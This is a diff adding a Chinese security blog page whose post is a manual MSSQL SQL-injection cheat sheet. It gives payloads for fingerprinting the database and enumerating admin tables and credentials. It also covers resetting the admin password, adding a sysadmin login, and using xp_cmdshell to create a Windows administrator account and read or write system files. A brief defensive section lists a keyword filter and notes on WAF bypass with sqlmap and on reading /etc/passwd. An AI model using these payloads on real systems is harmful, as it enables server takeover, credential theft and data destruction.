@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Secer" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="繁华一场梦  注入过程1.判断数据库类型：123456&amp;apos;（撇号）and (select count(*) from 独有表)&amp;gt;0 oracle:dualmssql:sysobjectsmysql:shemaaccess:mssysobjects 2.判断版本号：（sqlserver:2000）12nt5.0:win2000,nt5.2:2003 nt6.1:win7 spand">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="手注mssql">
+<meta property="og:url" content="http://yoursite.com/2018/08/21/手注mssql/index.html">
+<meta property="og:site_name" content="Secer">
+<meta property="og:description" content="繁华一场梦  注入过程1.判断数据库类型：123456&amp;apos;（撇号）and (select count(*) from 独有表)&amp;gt;0 oracle:dualmssql:sysobjectsmysql:shemaaccess:mssysobjects 2.判断版本号：（sqlserver:2000）12nt5.0:win2000,nt5.2:2003 nt6.1:win7 spand">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/pasted-107.png">
+<meta property="og:updated_time" content="2018-08-21T14:46:21.523Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="手注mssql">
+<meta name="twitter:description" content="繁华一场梦  注入过程1.判断数据库类型：123456&amp;apos;（撇号）and (select count(*) from 独有表)&amp;gt;0 oracle:dualmssql:sysobjectsmysql:shemaaccess:mssysobjects 2.判断版本号：（sqlserver:2000）12nt5.0:win2000,nt5.2:2003 nt6.1:win7 spand">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-107.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/21/手注mssql/"/>
+
+
+
+
+
+  <title>手注mssql | Secer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Secer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/21/手注mssql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shiqian">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">手注mssql</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-21T22:31:05+08:00">
+                2018-08-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+<p>繁华一场梦</p>
+<p><img src="\images\pasted-107.png" alt="upload successful"></p>
+<h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h3 id="1-判断数据库类型："><a href="#1-判断数据库类型：" class="headerlink" title="1.判断数据库类型："></a>1.判断数据库类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;（撇号）</span><br><span class="line">and (select count(*) from 独有表)&gt;0 </span><br><span class="line">oracle:dual</span><br><span class="line">mssql:sysobjects</span><br><span class="line">mysql:shema</span><br><span class="line">access:mssysobjects</span><br></pre></td></tr></table></figure>
+<h3 id="2-判断版本号："><a href="#2-判断版本号：" class="headerlink" title="2.判断版本号："></a>2.判断版本号：</h3><p>（sqlserver:2000）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nt5.0:win2000,nt5.2:2003 nt6.1:win7 sp</span><br><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-当前连接数据库的用户："><a href="#3-当前连接数据库的用户：" class="headerlink" title="3.当前连接数据库的用户："></a>3.当前连接数据库的用户：</h3><p>（dbo=sa）<br><code>and user&gt;0</code></p>
+<h3 id="4-判断当前连接的数据库："><a href="#4-判断当前连接的数据库：" class="headerlink" title="4.判断当前连接的数据库："></a>4.判断当前连接的数据库：</h3><p>(article)<br><code>and db_name()&gt;0</code></p>
+<h3 id="5-判断其它数据库"><a href="#5-判断其它数据库" class="headerlink" title="5.判断其它数据库"></a>5.判断其它数据库</h3><p><code>and (select name from master..sysdatabases where dbid=6)&gt;0</code></p>
+<h3 id="6-判断表："><a href="#6-判断表：" class="headerlink" title="6.判断表："></a>6.判断表：</h3><p>‘t_jiaozhu’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure></p>
+<h3 id="7-判断其它表："><a href="#7-判断其它表：" class="headerlink" title="7.判断其它表："></a>7.判断其它表：</h3><p>admin<br><code>and name not in(&#39;t_jiaozhu&#39;,&#39;Aclass&#39;)</code><br>加入到6条语句最后一个括号前：</p>
+<h3 id="8-判断列名："><a href="#8-判断列名：" class="headerlink" title="8.判断列名："></a>8.判断列名：</h3><p>admin(usernae,password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></p>
+<h3 id="9-判断值"><a href="#9-判断值" class="headerlink" title="9.判断值"></a>9.判断值</h3><p><code>and (select username from admin)&gt;0</code></p>
+<h3 id="10-改密码："><a href="#10-改密码：" class="headerlink" title="10.改密码："></a>10.改密码：</h3><p>md5,小葵多功能转换工具：111转为md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--</span><br></pre></td></tr></table></figure></p>
+<p>sqlserver高级操作：</p>
+<h1 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h1><h3 id="一。数据库提权："><a href="#一。数据库提权：" class="headerlink" title="一。数据库提权："></a>一。数据库提权：</h3><h4 id="1-添加数据库的用户；"><a href="#1-添加数据库的用户；" class="headerlink" title="1.添加数据库的用户；"></a>1.添加数据库的用户；</h4><p><code>;exec master..sp_addlogin hyq,888888;--</code></p>
+<h4 id="2-查看："><a href="#2-查看：" class="headerlink" title="2.查看："></a>2.查看：</h4><p><code>mssqlserver--企业管理器--安全性--登录</code></p>
+<h4 id="3-提权："><a href="#3-提权：" class="headerlink" title="3.提权："></a>3.提权：</h4><p>把hyq加入sysadmin组<br><code>;exec master..sp_addsrvrolemember hyq,sysadmin;--</code></p>
+<h4 id="4-利用："><a href="#4-利用：" class="headerlink" title="4.利用："></a>4.利用：</h4><p>数据库连接工具：查询分析器,navicat:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from </span><br><span class="line">drop database</span><br></pre></td></tr></table></figure></p>
+<h3 id="二。操作系统提权"><a href="#二。操作系统提权" class="headerlink" title="二。操作系统提权"></a>二。操作系统提权</h3><h4 id="1-新建用户"><a href="#1-新建用户" class="headerlink" title="1.新建用户:"></a>1.新建用户:</h4><p><code>;exec master..xp_cmdshell &#39;net user cisp 888888 /add &#39;--</code></p>
+<h4 id="2-提权："><a href="#2-提权：" class="headerlink" title="2.提权："></a>2.提权：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure>
+<h4 id="3-利用："><a href="#3-利用：" class="headerlink" title="3.利用："></a>3.利用：</h4><p>3389;ipc空连接</p>
+<h3 id="三。读系统文件"><a href="#三。读系统文件" class="headerlink" title="三。读系统文件"></a>三。读系统文件</h3><p><code>c:\boot.ini</code></p>
+<h4 id="1-数据连接工具：navicat"><a href="#1-数据连接工具：navicat" class="headerlink" title="1.数据连接工具：navicat:"></a>1.数据连接工具：navicat:</h4><h4 id="2-查询–新建查询"><a href="#2-查询–新建查询" class="headerlink" title="2.查询–新建查询"></a>2.查询–新建查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure>
+<h3 id="四。向系统写文件"><a href="#四。向系统写文件" class="headerlink" title="四。向系统写文件"></a>四。向系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br><span class="line">a.bat</span><br><span class="line">:1</span><br><span class="line">start iexplore.exe</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure>
+<h3 id="五。xp-cmdshell防御："><a href="#五。xp-cmdshell防御：" class="headerlink" title="五。xp_cmdshell防御："></a>五。xp_cmdshell防御：</h3><h4 id="1-删除："><a href="#1-删除：" class="headerlink" title="1.删除："></a>1.删除：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="2-恢复："><a href="#2-恢复：" class="headerlink" title="2.恢复："></a>2.恢复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="3-防xp-cmdshell"><a href="#3-防xp-cmdshell" class="headerlink" title="3.防xp_cmdshell."></a>3.防xp_cmdshell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">防未公布：cmd反弹</span><br><span class="line">c:\windows\system32\cmd.exe</span><br><span class="line">删除所有默认权限，添加administrator--完全控制</span><br></pre></td></tr></table></figure>
+<h3 id="六-防注入："><a href="#六-防注入：" class="headerlink" title="六.防注入："></a>六.防注入：</h3><h4 id="1-脚本调用："><a href="#1-脚本调用：" class="headerlink" title="1.脚本调用："></a>1.脚本调用：</h4><p>编写防注入脚本：noinject.asp<br>过滤关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and or union ; &apos; sp_ xp_ update</span><br><span class="line">exec select delete drop</span><br><span class="line">防post get cookie</span><br></pre></td></tr></table></figure></p>
+<p>判断哪个脚本有漏洞<br>调用：<code>include file=noinject.asp</code><br>最前面：搜索型</p>
+<h4 id="2-安全编码："><a href="#2-安全编码：" class="headerlink" title="2.安全编码："></a>2.安全编码：</h4><p>int–&gt;cint,参数化查询：</p>
+<h4 id="3-waf"><a href="#3-waf" class="headerlink" title="3.waf:"></a>3.waf:</h4><p>web app fw: 软件，硬件<br>sqlmap:tamper:base<br>通配符：cat ??t /etc/passwd<br>as /**/<br>hash:<br>sqlmap.py -u url -v 3</p>
+
+      
+    </div>
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>史前感谢您的来访-------------</div>
+    
+</div>
+	
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/21/web终极加固-mssqlserver/" rel="next" title="web终极加固">
+                <i class="fa fa-chevron-left"></i> web终极加固
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">shiqian</p>
+              <p class="site-description motion-element" itemprop="description">繁华一场梦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#注入过程"><span class="nav-number">1.</span> <span class="nav-text">注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断数据库类型："><span class="nav-number">1.0.1.</span> <span class="nav-text">1.判断数据库类型：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-判断版本号："><span class="nav-number">1.0.2.</span> <span class="nav-text">2.判断版本号：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-当前连接数据库的用户："><span class="nav-number">1.0.3.</span> <span class="nav-text">3.当前连接数据库的用户：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-判断当前连接的数据库："><span class="nav-number">1.0.4.</span> <span class="nav-text">4.判断当前连接的数据库：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-判断其它数据库"><span class="nav-number">1.0.5.</span> <span class="nav-text">5.判断其它数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-判断表："><span class="nav-number">1.0.6.</span> <span class="nav-text">6.判断表：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-判断其它表："><span class="nav-number">1.0.7.</span> <span class="nav-text">7.判断其它表：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-判断列名："><span class="nav-number">1.0.8.</span> <span class="nav-text">8.判断列名：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-判断值"><span class="nav-number">1.0.9.</span> <span class="nav-text">9.判断值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-改密码："><span class="nav-number">1.0.10.</span> <span class="nav-text">10.改密码：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权过程"><span class="nav-number">2.</span> <span class="nav-text">提权过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一。数据库提权："><span class="nav-number">2.0.1.</span> <span class="nav-text">一。数据库提权：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-添加数据库的用户；"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">1.添加数据库的用户；</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-查看："><span class="nav-number">2.0.1.2.</span> <span class="nav-text">2.查看：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-提权："><span class="nav-number">2.0.1.3.</span> <span class="nav-text">3.提权：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-利用："><span class="nav-number">2.0.1.4.</span> <span class="nav-text">4.利用：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二。操作系统提权"><span class="nav-number">2.0.2.</span> <span class="nav-text">二。操作系统提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-新建用户"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">1.新建用户:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-提权："><span class="nav-number">2.0.2.2.</span> <span class="nav-text">2.提权：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-利用："><span class="nav-number">2.0.2.3.</span> <span class="nav-text">3.利用：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三。读系统文件"><span class="nav-number">2.0.3.</span> <span class="nav-text">三。读系统文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-数据连接工具：navicat"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">1.数据连接工具：navicat:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-查询–新建查询"><span class="nav-number">2.0.3.2.</span> <span class="nav-text">2.查询–新建查询</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四。向系统写文件"><span class="nav-number">2.0.4.</span> <span class="nav-text">四。向系统写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五。xp-cmdshell防御："><span class="nav-number">2.0.5.</span> <span class="nav-text">五。xp_cmdshell防御：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-删除："><span class="nav-number">2.0.5.1.</span> <span class="nav-text">1.删除：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-恢复："><span class="nav-number">2.0.5.2.</span> <span class="nav-text">2.恢复：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-防xp-cmdshell"><span class="nav-number">2.0.5.3.</span> <span class="nav-text">3.防xp_cmdshell.</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六-防注入："><span class="nav-number">2.0.6.</span> <span class="nav-text">六.防注入：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-脚本调用："><span class="nav-number">2.0.6.1.</span> <span class="nav-text">1.脚本调用：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-安全编码："><span class="nav-number">2.0.6.2.</span> <span class="nav-text">2.安全编码：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-waf"><span class="nav-number">2.0.6.3.</span> <span class="nav-text">3.waf:</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shiqian</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
